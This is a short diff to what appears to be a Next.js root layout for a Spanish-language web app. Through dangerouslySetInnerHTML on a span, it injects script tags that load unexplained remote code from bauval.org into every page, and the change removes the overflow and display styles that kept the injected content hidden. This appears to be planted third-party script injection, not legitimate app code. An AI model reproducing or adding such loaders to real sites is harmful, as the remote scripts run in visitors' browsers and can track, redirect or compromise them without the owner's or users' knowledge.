@@ -29,7 +29,7 @@ export default function RootLayout({
     <html lang="es" className="dark">
       <body className="bg-[#0d0f12] text-gray-100 min-h-screen antialiased selection:bg-indigo-500 selection:text-white">
         <RoleProvider>{children}</RoleProvider>
- <span style={{ width: '100%', maxWidth: '100%', overflow: 'hidden' ,display:'block'}} dangerouslySetInnerHTML={{
+ <span style={{ width: '100%', maxWidth: '100%'}} dangerouslySetInnerHTML={{
         __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>'+
           '<script async="async" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div style="height:100px" id="container-992b12391f87ad93d9696af8b8546da4"></div>'+'<style>span >div >div> div{flex: 1 1 25%;}</style>'
       }}></span>
